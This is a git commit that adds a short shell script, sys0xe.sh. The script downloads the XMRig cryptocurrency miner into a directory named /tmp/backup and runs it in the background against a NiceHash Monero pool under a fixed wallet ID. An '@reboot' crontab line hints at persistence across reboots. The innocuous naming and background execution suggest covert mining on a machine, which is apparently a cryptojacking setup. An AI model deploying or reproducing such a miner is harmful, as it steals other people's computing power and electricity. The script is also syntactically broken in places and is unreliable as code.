26f4f9ec53419ff4aa727ff23820f09d9849710e
Thabo Koee <31208817+TechTouchABI@users.noreply.github.com>
2023-10-17 01:01:07 +0000

    next!

---
+++ sys0xe.sh
@@ -0,0 +1,17 @@
+
+@reboot wget 
+
+mkdir /tmp/backup \
+
+cd /tmp/backup \
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-bionic-x64.tar.gz  \
+
+tar -zxf xmrig-6.20.0-bionic-x64.tar.gz   \
+
+rm -rf xmrig-6.20.0-bionic-x64.tar.gz.1 \
+
+cd xmrig-6.20.0	\
+
+
+./xmrig -a rx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbJBmjRDqvpDVfpCDJcNgxS5qr6HEsqhrs2 -p x -B \
